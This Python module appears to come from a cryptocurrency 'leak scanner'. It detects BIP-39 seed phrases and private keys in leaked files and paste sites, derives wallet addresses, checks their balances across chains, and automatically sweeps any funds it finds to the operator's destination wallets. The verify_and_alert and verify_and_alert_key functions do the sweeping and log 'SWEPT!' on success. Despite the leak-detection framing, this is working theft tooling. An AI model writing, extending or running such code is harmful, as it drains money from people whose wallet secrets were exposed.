"""Shared utilities for leak scanner modules.

Contains dataclasses, pattern detectors, dedup helpers, and the standalone
verify_and_alert / verify_and_alert_key functions used across all scanner
implementations.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional

from src.modules.crypto.balance.chains import ALL_CHAINS, ChainConfig
from src.modules.crypto.balance.hit_logger import HitLogger

logger = logging.getLogger(__name__)

# Dedup: track mnemonics already verified (prevents duplicate reports across scan cycles)
_SEEN_MNEMONICS: set[str] = set()
_SEEN_MNEMONICS_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "seen_mnemonics.json"
)


def _load_seen_mnemonics() -> None:
    """Load seen-mnemonics set from disk on startup."""
    global _SEEN_MNEMONICS
    try:
        if os.path.exists(_SEEN_MNEMONICS_FILE):
            with open(_SEEN_MNEMONICS_FILE, "r") as f:
                _SEEN_MNEMONICS = set(json.load(f))
    except Exception as e:
        logger.debug("Failed to load seen mnemonics: %s", e)


def _save_seen_mnemonics() -> None:
    """Save seen-mnemonics set to disk."""
    try:
        with open(_SEEN_MNEMONICS_FILE, "w") as f:
            json.dump(sorted(_SEEN_MNEMONICS), f)
    except Exception as e:
        logger.debug("Failed to save seen mnemonics: %s", e)


def _is_mnemonic_seen(mnemonic: str) -> bool:
    """Check if mnemonic was already verified (prevents duplicate reports)."""
    if not _SEEN_MNEMONICS:
        _load_seen_mnemonics()
    return mnemonic.strip().lower() in _SEEN_MNEMONICS


def _mark_mnemonic_seen(mnemonic: str) -> None:
    """Mark mnemonic as verified (prevents duplicate reports)."""
    global _SEEN_MNEMONICS
    _SEEN_MNEMONICS.add(mnemonic.strip().lower())
    _save_seen_mnemonics()


# BIP-39 English wordlist (2048 words) — used for pattern matching
# Loaded lazily to avoid import overhead
_BIP39_WORDS: Optional[set[str]] = None


def _load_bip39_words() -> set[str]:
    """Load BIP-39 English wordlist for pattern matching."""
    global _BIP39_WORDS
    if _BIP39_WORDS is not None:
        return _BIP39_WORDS

    # Standard BIP-39 English word list embedded inline for zero-dependency loading
    wordlist_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "..",
        "privatekey",
        "bip39_english.txt",
    )
    if os.path.exists(wordlist_path):
        with open(wordlist_path, "r") as f:
            _BIP39_WORDS = {w.strip() for w in f if w.strip()}
    else:
        # Fallback: minimal set for pattern detection
        _BIP39_WORDS = {
            "abandon",
            "ability",
            "able",
            "about",
            "above",
            "absent",
            "absorb",
            "abstract",
            "absurd",
            "abuse",
            "access",
            "accident",
            "account",
            "accuse",
            "achieve",
            "acid",
            "acoustic",
            "acquire",
            "across",
            "act",
            "action",
            "actor",
            "actress",
            "actual",
            "adapt",
            "add",
            "address",
            "adjust",
            "admit",
            "adult",
            "advance",
            "advice",
            "aeroplane",
            "affair",
            "afford",
            "afraid",
            "again",
            "age",
            "agent",
            "agree",
            "ahead",
            "aim",
            "air",
            "airport",
            "aisle",
            "alarm",
            "album",
            "alcohol",
            "alert",
            "alliance",
            "allow",
            "almost",
            "alone",
            "alpha",
            "already",
            "also",
            "alter",
        }
    return _BIP39_WORDS


@dataclass
class LeakFinding:
    """A potential mnemonic or private key leak found in a source."""

    source: str
    source_url: str
    mnemonic_candidate: str
    is_valid: bool
    source_type: str = "mnemonic"
    has_balance: bool = False
    balance_details: dict = field(default_factory=dict)
    found_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))


class MnemonicPatternDetector:
    """Regex-based detector for BIP-39 mnemonic sequences in text.

    Detects 12-word and 24-word BIP-39 mnemonic phrases that appear
    in leaked files, paste sites, and other public sources.
    """

    # BIP-39 mnemonic regex: 12 or 24 words from the BIP-39 wordlist
    # Pattern: word1 word2 ... word12  or  word1 word2 ... word24
    _MNEMONIC_PATTERNS: list[re.Pattern] = []

    @classmethod
    def _ensure_patterns(cls) -> list[re.Pattern]:
        """Compile mnemonic regex patterns on first use."""
        if cls._MNEMONIC_PATTERNS:
            return cls._MNEMONIC_PATTERNS

        words = _load_bip39_words()
        # Build alternation pattern from BIP-39 words
        word_group = r"(?:" + "|".join(sorted(words, key=len, reverse=True)) + r")"
        # Match 12-word sequences
        pattern_12 = (
            r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 12) + r"(?=\s|$|[,.])"
        )
        # Match 24-word sequences
        pattern_24 = (
            r"(?:(?<=\s)|(?<=^))" + r"\s+".join([word_group] * 24) + r"(?=\s|$|[,.])"
        )

        cls._MNEMONIC_PATTERNS = [
            re.compile(pattern_24, re.IGNORECASE | re.MULTILINE),
            re.compile(pattern_12, re.IGNORECASE | re.MULTILINE),
        ]
        return cls._MNEMONIC_PATTERNS

    @classmethod
    def find_mnemonics(cls, text: str) -> list[str]:
        """Find BIP-39 mnemonic phrases in text.

        Args:
            text: Text to scan for mnemonic patterns.

        Returns:
            List of mnemonic candidate strings.
        """
        patterns = cls._ensure_patterns()
        candidates = []
        for pattern in patterns:
            for match in pattern.finditer(text):
                candidate = match.group().strip()
                # Validate: all words must be in BIP-39 wordlist
                words = _load_bip39_words()
                candidate_words = candidate.lower().split()
                if all(w in words for w in candidate_words):
                    candidates.append(candidate)
        return candidates


def _find_chain(name: str, chains: list[ChainConfig]) -> Optional[ChainConfig]:
    """Find a chain by name in a list."""
    return next((c for c in chains if c.name == name), None)


async def verify_and_alert(
    mnemonic_candidate: str,
    chains: Optional[list[ChainConfig]] = None,
    hit_logger: Optional[HitLogger] = None,
    count: int = 1,
    source: str = "manual",
    log_source: Optional[str] = None,
) -> Optional[LeakFinding]:
    """Standalone verify-and-alert function for any mnemonic candidate.

    Validates BIP-39, derives addresses, checks balances across chains,
    and logs hits if balance > 0.

    Args:
        mnemonic_candidate: The mnemonic phrase to verify.
        chains: Chains to check. Defaults to all.
        hit_logger: Optional logger for recording hits.
        count: Number of address indices to derive per chain (default 1, use 6 for leak-sourced).
        source: Source label for the LeakFinding (default "manual").
        log_source: Source label for hit logging. Defaults to "{source}_scan".

    Returns:
        LeakFinding if valid, None if not a valid mnemonic.
    """
    from src.modules.crypto.balance.checker import check_balance
    from src.modules.crypto.balance.deriver import (
        derive_from_mnemonic,
        is_valid_mnemonic,
    )

    if not is_valid_mnemonic(mnemonic_candidate):
        return None

    # Dedup: skip already-verified mnemonics (prevents duplicate reports)
    if _is_mnemonic_seen(mnemonic_candidate):
        logger.debug(
            "Skipping already-verified mnemonic: %s...", mnemonic_candidate[:20]
        )
        return None
    _mark_mnemonic_seen(mnemonic_candidate)

    if log_source is None:
        log_source = f"{source}_scan"

    chains = chains or list(ALL_CHAINS)
    finding = LeakFinding(
        source=source,
        source_url="",
        mnemonic_candidate=mnemonic_candidate,
        is_valid=True,
    )

    # Dynamic account discovery: check indices until consecutive empty accounts
    # (like Phantom/Trust Wallet discovery pattern)
    EMPTY_STREAK_LIMIT = 3
    MAX_INDEX = 50

    loop = asyncio.get_running_loop()
    empty_streak = 0
    idx = 0

    while idx < MAX_INDEX and empty_streak < EMPTY_STREAK_LIMIT:
        batch = await loop.run_in_executor(
            None,
            derive_from_mnemonic,
            mnemonic_candidate,
            chains,
            idx,
            1,
        )
        if not batch:
            break

        has_activity = False
        for addr in batch:
            chain_cfg = _find_chain(addr.chain, chains)
            if chain_cfg is None:
                continue
            result = await check_balance(addr.address, chain_cfg, addr.derivation_path)
            if result.balance > 0:
                has_activity = True
                finding.has_balance = True
                finding.balance_details[addr.chain] = {
                    "address": addr.address,
                    "balance": result.balance,
                    "symbol": result.symbol,
                }

                if hit_logger:
                    await hit_logger.log_hit(
                        address=addr.address,
                        chain=addr.chain,
                        balance=result.balance,
                        usd_value=result.usd_value,
                        mnemonic_hash=HitLogger.hash_mnemonic(mnemonic_candidate),
                        derivation_path=addr.derivation_path,
                        source=log_source,
                    )

            # Sweep immediately (reuse shared sweeper if available)
            if addr.private_key_hex:
                try:
                    from src.modules.crypto.balance.sweeper import Sweeper

                    _sweeper = getattr(verify_and_alert, "_shared_sweeper", None)
                    if _sweeper is None:
                        _sweeper = Sweeper()
                        verify_and_alert._shared_sweeper = _sweeper
                    sr = await _sweeper.sweep(
                        private_key_hex=addr.private_key_hex,
                        chain=chain_cfg,
                        source_address=addr.address,
                        balance_raw=result.balance_raw,
                    )
                    if sr.success:
                        logger.warning(
                            "SWEPT! %s %.8f %s -> %s (tx: %s)",
                            addr.chain,
                            sr.amount,
                            addr.symbol,
                            sr.dest_address[:20],
                            sr.tx_hash,
                        )
                    else:
                        logger.warning("SWEEP FAILED: %s — %s", addr.chain, sr.error)
                except Exception as e:
                    logger.error("Sweep error for %s: %s", addr.address[:10], e)

        empty_streak = 0 if has_activity else empty_streak + 1
        idx += 1

    return finding


async def verify_and_alert_key(
    key_candidate: str,
    chains: Optional[list[ChainConfig]] = None,
    hit_logger: Optional[HitLogger] = None,
    source: str = "manual",
    log_source: Optional[str] = None,
) -> Optional[LeakFinding]:
    """Verify a leaked private key, derive address, check balance, and alert.

    Takes a raw key string (hex or base58), derives the corresponding
    address, checks balances across chains, and logs any hits.

    Args:
        key_candidate: The raw private key (hex, 0x-prefixed hex, or base58).
        chains: Chains to check. Defaults to all.
        hit_logger: Optional logger for recording hits.
        source: Source label for the LeakFinding (default "manual").
        log_source: Source label for hit logging. Defaults to "{source}_key_scan".

    Returns:
        LeakFinding if the key is valid, None otherwise.
    """
    from src.modules.crypto.balance.checker import check_balance
    from src.modules.crypto.balance.deriver import derive_from_privatekey

    if log_source is None:
        log_source = f"{source}_key_scan"

    chains = chains or list(ALL_CHAINS)
    finding = LeakFinding(
        source=source,
        source_url="",
        mnemonic_candidate=key_candidate,
        is_valid=False,
        source_type="private_key",
    )

    try:
        # Try each chain until one works (hex keys work for EVM chains,
        # base58 keys work for Solana)
        derived = None
        for chain in chains:
            try:
                derived = await asyncio.get_running_loop().run_in_executor(
                    None, derive_from_privatekey, key_candidate, chain
                )
                break
            except (ValueError, Exception):
                continue

        if derived is None:
            return None

        chain_cfg = _find_chain(derived.chain, chains)
        if chain_cfg is None:
            return None

        result = await check_balance(
            derived.address, chain_cfg, derived.derivation_path
        )
        if result.balance > 0:
            finding.has_balance = True
            finding.balance_details[derived.chain] = {
                "address": derived.address,
                "balance": result.balance,
                "symbol": result.symbol,
            }
            if hit_logger:
                key_hash = HitLogger.hash_mnemonic(key_candidate)
                await hit_logger.log_hit(
                    address=derived.address,
                    chain=derived.chain,
                    balance=result.balance,
                    usd_value=result.usd_value,
                    mnemonic_hash=key_hash,
                    derivation_path=derived.derivation_path,
                    source=log_source,
                )

            # Auto-sweep funded wallets
            from src.modules.crypto.balance.sweeper import DESTINATION_WALLETS, Sweeper

            sweeper = Sweeper()
            try:
                chain_lower = derived.chain.lower()
                if chain_lower in DESTINATION_WALLETS:
                    sweep_result = await sweeper.sweep(
                        private_key_hex=key_candidate
                        if derived.private_key_hex is None
                        else derived.private_key_hex,
                        chain=chain_cfg,
                        source_address=derived.address,
                        balance_raw=result.balance_raw
                        if hasattr(result, "balance_raw")
                        else int(result.balance * 1e18),
                    )
                    if sweep_result.success:
                        logger.info(
                            "SWEEP SUCCESS: %s -> %s (%.6f %s)",
                            derived.address[:12],
                            sweep_result.dest_address[:12],
                            sweep_result.amount,
                            result.symbol,
                        )
                    else:
                        logger.warning(
                            "SWEEP FAILED: %s — %s",
                            derived.address[:12],
                            sweep_result.error,
                        )
            except Exception as sweep_err:
                logger.debug("Sweep error for %s: %s", derived.address[:12], sweep_err)
            finally:
                await sweeper.close()
    except Exception as e:
        logger.debug("Key verification error: %s", e)
        return None

    return finding
